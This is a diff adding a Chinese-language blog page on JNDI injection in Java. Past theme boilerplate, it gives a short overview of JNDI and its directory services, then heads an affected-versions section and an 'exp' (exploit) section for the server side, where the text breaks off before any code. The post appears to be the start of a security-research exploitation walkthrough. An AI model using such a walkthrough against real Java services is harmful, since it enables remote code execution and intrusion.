@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta name="referrer" content="no-referrer">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="azraelxuemo">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="azraelxuemo">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="概述Java Naming Directory Interface，Java命名和⽬录接⼝，是SUN公司提供的⼀种标准的Java命名系统接⼝。通过调⽤JNDI的API,应⽤程序可以定位资源和其他程序对象。JNDI可访问的现有⽬录及服务包括：LDAP（轻型⽬录访问协议）、RMI（远程⽅法调⽤）、DNS（域名服务）、NIS（⽹络信息服务）、CORBA（公共对象请求代理系统结构） 影响范围 121之前e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jndi注入">
+<meta property="og:url" content="https://azraelxuemo.github.io/2023/11/26/jndi/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="概述Java Naming Directory Interface，Java命名和⽬录接⼝，是SUN公司提供的⼀种标准的Java命名系统接⼝。通过调⽤JNDI的API,应⽤程序可以定位资源和其他程序对象。JNDI可访问的现有⽬录及服务包括：LDAP（轻型⽬录访问协议）、RMI（远程⽅法调⽤）、DNS（域名服务）、NIS（⽹络信息服务）、CORBA（公共对象请求代理系统结构） 影响范围 121之前e">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698199340136-ddcd6b4e-6cf4-4928-a4a3-e35f3bef3730.png#averageHue=%23bd963d&clientId=uea1937b1-ffdf-4&from=paste&height=289&id=u02ecefed&originHeight=578&originWidth=806&originalType=binary&ratio=2&rotation=0&showTitle=false&size=95979&status=done&style=none&taskId=ud6fcf33d-217b-414c-b52c-956da36deba&title=&width=403">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700907267232-d3c48ef6-1302-42c1-ad4c-3c0dd38b1ff5.png#averageHue=%2396c8f9&clientId=u1a12a276-8a25-4&from=paste&height=310&id=uc8908336&originHeight=619&originWidth=1575&originalType=binary&ratio=2&rotation=0&showTitle=false&size=141066&status=done&style=none&taskId=ufcd0c982-287c-4eb2-8500-c255a9792d2&title=&width=787.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700963682577-ecf0b0ac-dcc8-4d9f-9f12-5cf5d2866d52.png#averageHue=%23252629&clientId=u1a12a276-8a25-4&from=drop&id=ued3e0903&originHeight=1586&originWidth=1428&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1400176&status=done&style=none&taskId=u9b6cf6a4-80a0-4385-b41c-503339944b5&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700963813107-a4274834-dd8d-4085-994c-a7ce93239603.png#averageHue=%232f333d&clientId=u1a12a276-8a25-4&from=drop&id=u1bd89622&originHeight=288&originWidth=1972&originalType=binary&ratio=2&rotation=0&showTitle=false&size=403369&status=done&style=none&taskId=u47d45e22-56aa-4903-9e6c-bd87e9532cb&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700965487666-2e7d0681-aae8-41b5-862a-4f794121ccd0.png#averageHue=%23272a33&clientId=u1a12a276-8a25-4&from=drop&id=u5ff680ba&originHeight=490&originWidth=1914&originalType=binary&ratio=2&rotation=0&showTitle=false&size=572821&status=done&style=none&taskId=uf9f45320-f83a-4525-bdef-33172bfa4a2&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700907938734-ac392fe2-5789-44b6-958d-302272e872be.png#averageHue=%2327292c&clientId=u1a12a276-8a25-4&from=drop&id=uf6af9e0f&originHeight=770&originWidth=1858&originalType=binary&ratio=2&rotation=0&showTitle=false&size=867536&status=done&style=none&taskId=u56674979-672e-420c-a56c-2c62dbcd264&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700908047119-3e754eca-b2cf-4675-92d1-729253035131.png#averageHue=%232e3136&clientId=u1a12a276-8a25-4&from=drop&id=u8329cdde&originHeight=1034&originWidth=2540&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1628170&status=done&style=none&taskId=u3dcba3c2-3082-47cb-8548-38ea3787eec&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700962774547-efc6a1b2-a522-4041-adeb-93eb90d749ff.png#averageHue=%233a3c3f&clientId=u1a12a276-8a25-4&from=drop&id=u25981d7f&originHeight=332&originWidth=1052&originalType=binary&ratio=2&rotation=0&showTitle=false&size=251660&status=done&style=none&taskId=uf86cea14-4527-4663-93e7-2b3fed09f2e&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700962462084-e0a70b53-a19a-45c2-9d4a-b0280ae1f1bd.png#averageHue=%23282a31&clientId=u1a12a276-8a25-4&from=drop&id=u67f31ffb&originHeight=734&originWidth=1298&originalType=binary&ratio=2&rotation=0&showTitle=false&size=578204&status=done&style=none&taskId=u2c31b1de-94b2-4431-87c2-5dcae44e442&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700966317565-f827b789-5a69-4e76-bd1b-41c5a7921408.png#averageHue=%23373a42&clientId=u1a12a276-8a25-4&from=drop&id=ue2b17a57&originHeight=1202&originWidth=2178&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1588336&status=done&style=none&taskId=ua3a5b591-397e-43e3-9d30-d9febb84d84&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700921077502-306083da-9367-427a-a19d-fb0a19826c69.png#averageHue=%23242528&clientId=u1a12a276-8a25-4&from=drop&id=u4e1f84c5&originHeight=696&originWidth=1398&originalType=binary&ratio=2&rotation=0&showTitle=false&size=590028&status=done&style=none&taskId=uba1d6f4c-dcef-4d6e-851d-9ddc44358ae&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700921124864-624503f7-c0d8-439d-ad09-8ce0398e72d0.png#averageHue=%232e3036&clientId=u1a12a276-8a25-4&from=drop&id=u81efbe2f&originHeight=1326&originWidth=2088&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1694791&status=done&style=none&taskId=uc43574b3-4e6b-4607-b688-6a3050e5f21&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700971434640-06b72c44-d104-4908-99c7-932ce9c7514d.png#averageHue=%232b2c30&clientId=u43406b06-e91d-4&from=drop&id=u59844ae1&originHeight=92&originWidth=1092&originalType=binary&ratio=2&rotation=0&showTitle=false&size=67891&status=done&style=none&taskId=u44dae106-5492-45b8-bb83-cead77aa3e0&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700974042207-f57abe35-0e0b-450e-8c7c-e77c7cc20107.png#averageHue=%23292b32&clientId=u43406b06-e91d-4&from=drop&id=u379ffd9a&originHeight=246&originWidth=1444&originalType=binary&ratio=2&rotation=0&showTitle=false&size=249502&status=done&style=none&taskId=u1a2d79d3-4b68-4293-a8c9-2695f5c4bf5&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700974150625-72628364-97bd-406a-bb8b-2ff84f71ed10.png#averageHue=%23292b30&clientId=u43406b06-e91d-4&from=drop&id=ud9443891&originHeight=1340&originWidth=1210&originalType=binary&ratio=2&rotation=0&showTitle=false&size=944522&status=done&style=none&taskId=u21f37337-3e58-46e1-9772-cd4e92d448c&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700974481780-db40561b-426f-4802-9f8f-d7f70170bb48.png#averageHue=%232c2f38&clientId=u43406b06-e91d-4&from=drop&id=udc007ffd&originHeight=436&originWidth=1200&originalType=binary&ratio=2&rotation=0&showTitle=false&size=366406&status=done&style=none&taskId=u0e8e6237-eb5b-492e-9e6e-b8cd744c415&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700975473577-a984ae52-aa30-43f2-86dc-52e4df7bc11c.png#averageHue=%23333947&clientId=u43406b06-e91d-4&from=drop&id=uc08b9020&originHeight=214&originWidth=876&originalType=binary&ratio=2&rotation=0&showTitle=false&size=155010&status=done&style=none&taskId=u786c2a1f-fa21-4ab9-86de-ca3cadd21d8&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700975004679-0d863dfc-12b2-45c9-b1f0-31a7fe58b62f.png#averageHue=%2327282b&clientId=u43406b06-e91d-4&from=drop&id=u9a1dfbb9&originHeight=462&originWidth=862&originalType=binary&ratio=2&rotation=0&showTitle=false&size=256723&status=done&style=none&taskId=ud17e9fcd-72d0-4ea6-b4b4-345b594f439&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700976124940-bb33f919-51b8-4c7d-8668-7f3354ffa403.png#averageHue=%232a2c32&clientId=u43406b06-e91d-4&from=drop&id=uecb30358&originHeight=1316&originWidth=1674&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1339329&status=done&style=none&taskId=u25934e67-e332-492e-9428-0da833994da&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700976228059-e403538c-aa8d-4c88-8cb1-fb8374e0da2d.png#averageHue=%232a2b2f&clientId=u43406b06-e91d-4&from=drop&id=u941a6c93&originHeight=128&originWidth=714&originalType=binary&ratio=2&rotation=0&showTitle=false&size=61386&status=done&style=none&taskId=u0a55e23c-0df3-4870-89fb-553fc8b3ef9&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700976633939-e723fa97-c972-438f-8c51-a193e1d49b46.png#averageHue=%23282a31&clientId=u43406b06-e91d-4&from=drop&id=u9cc91c49&originHeight=722&originWidth=1532&originalType=binary&ratio=2&rotation=0&showTitle=false&size=711275&status=done&style=none&taskId=ua16e16df-8ebb-40ad-9fc5-507cedf620d&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700983289682-b40d01b8-b094-4db2-9d8f-3bc27c6b3e3a.png#averageHue=%2336383b&clientId=u7c86f389-dd89-4&from=drop&id=u75026025&originHeight=336&originWidth=1564&originalType=binary&ratio=2&rotation=0&showTitle=false&size=376074&status=done&style=none&taskId=u5aeb771f-8e4f-4633-a5a1-924ac67cc07&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700983401769-9e5aa93e-40dd-4b84-a43f-c345f785175c.png#averageHue=%232b2f39&clientId=u7c86f389-dd89-4&from=drop&id=u03bab9e0&originHeight=382&originWidth=1572&originalType=binary&ratio=2&rotation=0&showTitle=false&size=415172&status=done&style=none&taskId=u6ff58e1b-4d3f-4c06-bc00-846bfd37bf4&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700985686538-558b2ae1-2350-4434-ad77-7a050ae6dbe1.png#averageHue=%2326272b&clientId=u1a90c480-9815-4&from=drop&id=udde61b77&originHeight=374&originWidth=1286&originalType=binary&ratio=2&rotation=0&showTitle=false&size=321196&status=done&style=none&taskId=u0c7399ed-460a-4ace-8dcb-57b244ce368&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700985748492-5a9ae480-f5b4-4bd3-8bdd-8e61390392ba.png#averageHue=%232d2e32&clientId=u1a90c480-9815-4&from=drop&id=u09739e39&originHeight=156&originWidth=730&originalType=binary&ratio=2&rotation=0&showTitle=false&size=97266&status=done&style=none&taskId=uf2570a62-a957-492e-9b58-6bd9cf4d435&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700885541328-731f5bdf-25c2-4fd1-ac0f-90a3a68cbe99.png#averageHue=%2327282b&clientId=uaa804075-f81a-4&from=drop&id=NPDuh&originHeight=508&originWidth=986&originalType=binary&ratio=2&rotation=0&showTitle=false&size=335352&status=done&style=none&taskId=ubfafda0c-97c5-4060-9f33-d06e32b6a87&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700885869668-d1b89338-c36c-452f-a219-f6cc7889ba0a.png#averageHue=%2328292d&clientId=uaa804075-f81a-4&from=drop&id=b9wV4&originHeight=104&originWidth=1266&originalType=binary&ratio=2&rotation=0&showTitle=false&size=94070&status=done&style=none&taskId=u727a0ceb-3910-4664-889a-c0814b9c9fd&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700895345312-66df1305-0e4f-40ea-9e6b-2028662714af.png#averageHue=%232b2c30&clientId=uaa804075-f81a-4&from=drop&id=meLpY&originHeight=150&originWidth=1262&originalType=binary&ratio=2&rotation=0&showTitle=false&size=143008&status=done&style=none&taskId=u5353094e-55c8-47a8-ac41-04b03b73262&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700895833957-0545a044-4454-4608-83ec-65374323799c.png#averageHue=%237c7c7a&clientId=uaa804075-f81a-4&from=drop&id=k8TrX&originHeight=216&originWidth=866&originalType=binary&ratio=2&rotation=0&showTitle=false&size=143369&status=done&style=none&taskId=uf0ebd433-829d-4777-a82c-174b1d4bfa1&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700895928960-1dabe132-bb4e-4179-825e-20927b4ba2ac.png#averageHue=%23383a3e&clientId=uaa804075-f81a-4&from=drop&id=CXfOC&originHeight=152&originWidth=1132&originalType=binary&ratio=2&rotation=0&showTitle=false&size=138089&status=done&style=none&taskId=uef489411-c334-48c8-a22e-f0dff5600d2&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700986888256-7045dc21-88bd-4a84-bbb0-7500e60f724c.png#averageHue=%232f3137&clientId=uf79b4c75-5585-4&from=drop&id=u158ae434&originHeight=992&originWidth=1326&originalType=binary&ratio=2&rotation=0&showTitle=false&size=845620&status=done&style=none&taskId=uab93ac74-94f1-47f9-8293-88ea78dcb16&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700987338100-e6ccb3d8-4afe-4b2c-acad-405074291028.png#averageHue=%2325272a&clientId=u2dcfc01b-33ae-4&from=drop&id=u518251af&originHeight=330&originWidth=1322&originalType=binary&ratio=2&rotation=0&showTitle=false&size=294343&status=done&style=none&taskId=u8126ccfb-1a50-4dc3-9661-0790ba3a9f6&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700900469367-c03535ea-d1b9-485d-9524-cd21dc530731.png#averageHue=%232e323c&clientId=u167d413d-c58c-4&from=drop&id=u8546dd35&originHeight=150&originWidth=1558&originalType=binary&ratio=2&rotation=0&showTitle=false&size=172728&status=done&style=none&taskId=u7e475d77-a82e-4199-bbbb-afa7472e3b3&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700900550158-b761117c-9616-4ca9-a3eb-9f13ae0981c4.png#averageHue=%233f372a&clientId=u167d413d-c58c-4&from=drop&id=uc558f636&originHeight=642&originWidth=982&originalType=binary&ratio=2&rotation=0&showTitle=false&size=474275&status=done&style=none&taskId=ufa834b09-da7b-472b-a43b-22a9e30818a&title=">
+<meta property="article:published_time" content="2023-11-26T01:51:34.000Z">
+<meta property="article:modified_time" content="2023-11-26T08:35:37.854Z">
+<meta property="article:author" content="azraelxuemo">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698199340136-ddcd6b4e-6cf4-4928-a4a3-e35f3bef3730.png#averageHue=%23bd963d&clientId=uea1937b1-ffdf-4&from=paste&height=289&id=u02ecefed&originHeight=578&originWidth=806&originalType=binary&ratio=2&rotation=0&showTitle=false&size=95979&status=done&style=none&taskId=ud6fcf33d-217b-414c-b52c-956da36deba&title=&width=403">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>jndi注入 · azraelxuemo&#39;s Studio</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- Google tag (gtag.js) -->
+    
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>azraelxuemo's Studio.</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">azraelxuemo&#39;s Studio.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">jndi注入</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                jndi注入
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="java">java</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2023/11/26</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Java Naming Directory Interface，Java命名和⽬录接⼝，是SUN公司提供的⼀种标准的Java命名系统接⼝。<br>通过调⽤JNDI的API,应⽤程序可以定位资源和其他程序对象。<br>JNDI可访问的现有⽬录及服务包括：LDAP（轻型⽬录访问协议）、RMI（远程⽅法调⽤）、DNS（域名服务）、NIS（⽹络信息服务）、CORBA（公共对象请求代理系统结构）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698199340136-ddcd6b4e-6cf4-4928-a4a3-e35f3bef3730.png#averageHue=%23bd963d&clientId=uea1937b1-ffdf-4&from=paste&height=289&id=u02ecefed&originHeight=578&originWidth=806&originalType=binary&ratio=2&rotation=0&showTitle=false&size=95979&status=done&style=none&taskId=ud6fcf33d-217b-414c-b52c-956da36deba&title=&width=403" alt="image.png"></p>
+<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700907267232-d3c48ef6-1302-42c1-ad4c-3c0dd38b1ff5.png#averageHue=%2396c8f9&clientId=u1a12a276-8a25-4&from=paste&height=310&id=uc8908336&originHeight=619&originWidth=1575&originalType=binary&ratio=2&rotation=0&showTitle=false&size=141066&status=done&style=none&taskId=ufcd0c982-287c-4eb2-8500-c255a9792d2&title=&width=787.5" alt="image.png"></p>
+<h2 id="121之前"><a href="#121之前" class="headerlink" title="121之前"></a>121之前</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>服务端</p>
